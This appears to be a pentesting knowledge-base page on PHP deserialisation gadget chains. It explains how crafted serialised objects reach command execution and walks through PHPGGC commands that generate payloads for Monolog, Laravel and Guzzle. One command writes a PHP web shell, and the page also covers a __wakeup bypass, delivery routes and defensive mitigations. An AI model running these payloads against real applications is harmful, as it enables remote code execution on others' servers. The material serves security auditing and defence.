---
title: PHP deserialisation gadgets
slug: php-deserialization-gadgets
---

> **TL;DR:** A PHP gadget chain (Property-Oriented Programming, POP) stitches together magic methods of classes already on the autoloader so that deserialising a crafted object graph reaches `system`, `eval`, `call_user_func`, `include`, or a file-write. PHPGGC ships ready-made chains for popular frameworks.

## What it is
PHP's `unserialize` reconstructs an arbitrary object graph from a string. The runtime then calls magic methods on those objects automatically — `__wakeup`, `__destruct`, `__toString`. By choosing classes that, in their magic methods, dispatch to other objects, an attacker chains primitives until a final sink runs an OS command. The chain uses *only* classes already loaded by the target app — no new code is uploaded.

## Preconditions / where it applies
- A reachable deserialisation sink: `unserialize`, `Phar::*` metadata via phar:// stream (PHP < 8), `__unserialize`, `yaml_parse` with object support, `WDDX_unserialize`
- Composer autoload covering classes from a framework or library with a known chain (Laravel, Symfony, Guzzle, Monolog, CodeIgniter, Slim, Magento, Drupal, WordPress + plugins)
- PHP version compatible with the chain — some chains target 5.x string-handling quirks, others require 7.x typed properties

## Technique
1. **Confirm sink.** See [[php-code-auditing]] for grep patterns. Common patterns:
   - Raw `unserialize($_COOKIE['session'])`
   - Phar-as-image upload + later `file_exists($uploadPath)` — see [[php-magic-methods]] for the triggering surface
   - Framework session handler storing PHP-serialised data
2. **Inventory loaded classes.** `composer.lock` lists versions. Crosscheck with PHPGGC's `pl` command:
```bash
phpggc -l            # list all chains
phpggc -i Laravel    # info on Laravel-specific chains
```
3. **Pick a chain** matching versions. Example structure for `Monolog/RCE1`:
   - Entry: `Monolog\Handler\SyslogUdpHandler::__destruct` → calls `$this->close()` → calls `$this->socket->close()`
   - Pivot: `Monolog\Handler\BufferHandler::close` → flushes records via `$this->handler->handle(...)`
   - Sink: `Monolog\Formatter\LineFormatter::__toString` + reflection trickery, or chained to `assert($cmd)`
4. **Generate payload:**
```bash
phpggc Monolog/RCE1 system 'id' -b      # base64
phpggc Laravel/RCE9 system 'id' -f      # fast-destruct (no __wakeup ordering issues)
phpggc Guzzle/FW1 /tmp/sh '<?php system($_GET[0]); ?>' -b   # file-write primitive
```
5. **Deliver.** Set as cookie, POST body, JSON field that the app `unserialize`s, or phar metadata in an uploaded file (then trigger any stream sink referencing `phar://uploads/x.phar/foo`).
6. **Bypass `__wakeup` checks** (CVE-2016-7124, pre-7.0.12): set the property count in the serialised string higher than the real number of properties and `__wakeup` is skipped — `__destruct` still fires. PHPGGC's `-f` mode applies fast-destruct using a self-referencing array to force early GC.
7. **Custom chains.** When PHPGGC has no chain for the framework, hunt for: classes with `__destruct` that call methods on `$this->property`, then look for classes with `__toString`/`__call` whose body reaches `call_user_func`, `eval`, `assert`, `include`, `file_put_contents`, `system`, or magic property writes.

```bash
# Hunt for chain primitives
grep -RnE 'function __(destruct|wakeup|toString|call|invoke|get)' vendor/ src/
grep -RnE 'call_user_func|eval|assert|include|require' vendor/ | grep -B1 'function __'
```

## Detection and defence
- Replace `unserialize` with JSON/igbinary; otherwise use `unserialize($s, ['allowed_classes' => false])` to disable object instantiation
- Audit Composer dependencies for chain-eligible versions; pin upgrades on Laravel < 5.6, Symfony with known gadgets, Monolog < 2.x
- Set `phar.readonly=1` and (PHP 8.0+) understand that phar stream wrapper no longer auto-deserialises on file stat
- HMAC any data round-tripping through `serialize` (Snuffleupagus' `unserialize_hmac`)
- See [[php-magic-methods]] for the entry-point catalogue and [[java-deserialization-audit]] for the JVM equivalent

## References
- [PHPGGC](https://github.com/ambionics/phpggc) — chain library + payload generator
- [HackTricks — PHP deserialisation](https://book.hacktricks.wiki/en/pentesting-web/deserialization/php-deserialization-and-autoload-classes.html) — chain-construction walkthroughs
- [Ambionics blog](https://www.ambionics.io/blog/) — modern PHP gadget research (e.g. Laravel chains)
- [PortSwigger — PHP deserialization labs](https://portswigger.net/web-security/deserialization) — guided exploitation
